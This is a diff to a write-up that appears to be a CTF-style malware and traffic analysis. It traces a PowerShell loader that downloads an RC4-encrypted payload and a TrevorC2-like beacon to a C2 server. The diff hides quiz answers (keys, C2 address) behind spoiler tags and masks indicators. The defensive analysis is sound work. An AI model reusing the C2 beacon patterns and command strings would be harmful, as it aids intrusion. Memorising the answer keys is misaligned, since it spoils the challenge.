@@ -145,7 +145,7 @@ In plain English:
 
 ---
 
-### RC4 Decryption Routine
+### Decryption Routine
 
 The next section is the decryption logic:
 
@@ -191,7 +191,7 @@ RC4 Key-Scheduling Algorithm (KSA)
 
 </details>
 
-This confirms that the payload downloaded from `amd.bin` is encrypted and must be RC4-decrypted using the extracted key.
+This confirms that the payload downloaded from `amd.bin` is encrypted and must be decrypted using the extracted key.
 
 ---
 
@@ -256,8 +256,8 @@ Next, I filtered for traffic to and from that IP address. This revealed a single
 Based on the PowerShell script analysis, I knew the downloaded payload was:
 
 1. Hex encoded.
-2. RC4 encrypted.
-3. Encrypted with the key `X9vT3pL2QwE8xR6ZkYhC4s`.
+2. <details><summary>Question 2 Spoiler</summary>RC4 encrypted.</details>
+3. Encrypted with the key <details><summary>Question 3 Spoiler</summary>`X9vT3pL2QwE8xR6ZkYhC4s`</details>
 
 I recreated that process in CyberChef.
 
@@ -299,7 +299,7 @@ GET
 Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
 Accept-Encoding: identity
 [*] Cannot connect to {0} seconds...
-http://34.174.57.99/
+http://34.**.**.99/
 <!-- {0} oldcss= --></body>
 nothing
 cmd.exe /Q /c {0} 2>&1
@@ -309,7 +309,7 @@ These strings are extremely important.
 
 They indicate that the payload likely:
 
-1. Communicates with a C2 server at `34[.]174[.]57[.]99`.
+1. Communicates with a C2 server at <details><summary>Question 6 Spoiler</summary>`34[.]174[.]57[.]99`</details>
 2. Sends data through `/images?guid=`.
 3. Uses an old Internet Explorer-style User-Agent.
 4. Retrieves or parses tasking from a fake HTML page.
@@ -350,7 +350,7 @@ The strings recovered from the payload are consistent with that style of operati
 The key recovered from strings was:
 
 ```text
-M4squ3r4d3Th3P4ck3tSt34lthM0d31337
+<details><summary>Question 7 Spoiler</summary>M4squ3r4d3Th3P4ck3tSt34lthM0d31337</details>
 ```
 
 This value is 34 bytes long, which is not a valid raw AES key length. AES keys must be 16, 24, or 32 bytes.
@@ -358,7 +358,7 @@ This value is 34 bytes long, which is not a valid raw AES key length. AES keys m
 A common way to convert a passphrase into a valid AES-256 key is to take the SHA-256 hash of the passphrase.
 
 ```text
-SHA256("M4squ3r4d3Th3P4ck3tSt34lthM0d31337")
+<details><summary>Question 7 Spoiler</summary>SHA256("M4squ3r4d3Th3P4ck3tSt34lthM0d31337")</details>
 ```
 
 This produces a 32-byte value suitable for AES-256.
@@ -383,7 +383,7 @@ The request was made to:
 
 ```http
 GET /images?guid=<encoded_data> HTTP/1.1
-Host: 34.174.57.99
+Host: 34.**.**.99
 User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
 Accept-Encoding: identity
 Connection: Close
@@ -428,7 +428,7 @@ The client requested the C2 root page:
 
 ```http
 GET / HTTP/1.1
-Host: 34.174.57.99
+Host: 34.**.**.99
 Cookie: sessionid=MneddXbRtQMyUlh
 ```
 
@@ -443,7 +443,7 @@ The important detail is that the client reused the same `sessionid` cookie that 
 
 </details>
 
-The server responded with a Google-looking HTML page. However, this page was not served by Google. It was served by the C2 server at `34[.]174[.]57[.]99`.
+The server responded with a Google-looking HTML page. However, this page was not served by Google. It was served by the C2 server at `34[.]**[.]**[.]99`.
 
 The ETag for this response was:
 
@@ -469,7 +469,7 @@ The request followed the same pattern:
 
 ```http
 GET /images?guid=<large_encoded_blob> HTTP/1.1
-Host: 34.174.57.99
+Host: 34.**.**.99
 Cookie: sessionid=MneddXbRtQMyUlh
 User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
 ```
@@ -485,7 +485,7 @@ Based on the earlier TrevorC2 research and the payload strings, the data appears
 The AES key was derived by taking the SHA-256 hash of the recovered passphrase:
 
 ```text
-M4squ3r4d3Th3P4ck3tSt34lthM0d31337
+<details><summary>Question 7 Spoiler</summary>M4squ3r4d3Th3P4ck3tSt34lthM0d31337</details>
 ```
 
 For AES-CBC-style decryption, an IV is also required. In this case, the IV appears to be taken from the beginning of the encrypted payload. In CyberChef, this was handled by extracting the initial IV material and decrypting the remaining ciphertext.
@@ -524,13 +524,13 @@ The full activity can be summarized as follows:
 ```text
 1. PowerShell starts.
 2. PowerShell runs .\updates.ps1.
-3. updates.ps1 reconstructs the RC4 key.
-4. updates.ps1 downloads amd.bin from api-edgecloud[.]xyz.
+3. updates.ps1 reconstructs the *** key.
+4. updates.ps1 downloads amd.bin from api-edgecloud[.]***.
 5. The downloaded payload is whitespace-stripped and hex-decoded.
-6. The payload is RC4-decrypted.
+6. The payload is ***-decrypted.
 7. The decrypted EXE is written to %TEMP%\amdfendrsr.exe.
 8. The EXE is executed.
-9. The EXE beacons to 34[.]174[.]57[.]99/images?guid=.
+9. The EXE beacons to 34[.]**[.]**[.]99/images?guid=.
 10. The server issues a session cookie.
 11. The client requests / and receives a fake Google page.
 12. The client continues polling the server.
@@ -546,10 +546,10 @@ The full activity can be summarized as follows:
 
 | Indicator                                                       | Type           | Notes                          |
 | --------------------------------------------------------------- | -------------- | ------------------------------ |
-| `api-edgecloud[.]xyz`                                           | Domain         | Initial payload download       |
-| `hxxp://api-edgecloud[.]xyz/amd[.]bin`                          | URL            | RC4-encrypted payload          |
+| `api-edgecloud[.]***`                                           | Domain         | Initial payload download       |
+| `hxxp://api-edgecloud[.]***/amd[.]bin`                          | URL            | RC4-encrypted payload          |
 | `34[.]174[.]85[.]91`                                            | IP address     | Resolved payload download host |
-| `34[.]174[.]57[.]99`                                            | IP address     | C2 server                      |
+| `34[.]**[.]**[.]99`                                             | IP address     | C2 server                      |
 | `/images?guid=`                                                 | URI path/query | Encoded C2 communication       |
 | `sessionid=MneddXbRtQMyUlh`                                     | HTTP cookie    | C2 session tracking            |
 | `Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko` | User-Agent     | Hardcoded legacy browser UA    |
@@ -566,6 +566,8 @@ The full activity can be summarized as follows:
 
 ## Cryptographic / Encoding Artifacts
 
+<details><summary>Question 2, 3, 7 Spoiler</summary>
+
 | Artifact            | Value                                      |
 | ------------------- | ------------------------------------------ |
 | RC4 key             | `X9vT3pL2QwE8xR6ZkYhC4s`                   |
@@ -574,6 +576,8 @@ The full activity can be summarized as follows:
 | Encoding pattern    | Double Base64                              |
 | Empty response ETag | `da39a3ee5e6b4b0d3255bfef95601890afd80709` |
 | Decoy page ETag     | `544dec025c05c611ec4032a4c077907ce423361c` |
+
+</details>
 
 ---
 
